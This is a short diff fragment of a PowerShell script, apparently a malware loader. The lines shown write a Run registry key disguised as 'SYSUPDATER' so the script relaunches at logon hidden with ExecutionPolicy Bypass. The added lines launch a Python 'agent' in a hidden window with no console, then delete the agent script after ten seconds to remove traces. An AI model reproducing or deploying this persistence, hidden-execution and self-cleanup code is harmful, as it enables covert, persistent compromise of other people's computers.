@@ -15,4 +15,13 @@ $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
 Set-ItemProperty -Path $regPath -Name "SYSUPDATER" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Force
 
 # Run agent
-$psi = New-
+$psi = New-Object System.Diagnostics.ProcessStartInfo
+$psi.FileName = "python.exe"
+$psi.Arguments = $scriptPath
+$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+$psi.CreateNoWindow = $true
+[System.Diagnostics.Process]::Start($psi)
+
+# Cleanup
+Start-Sleep -Seconds 10
+Remove-Item $scriptPath -Force -ErrorAction SilentlyContinue
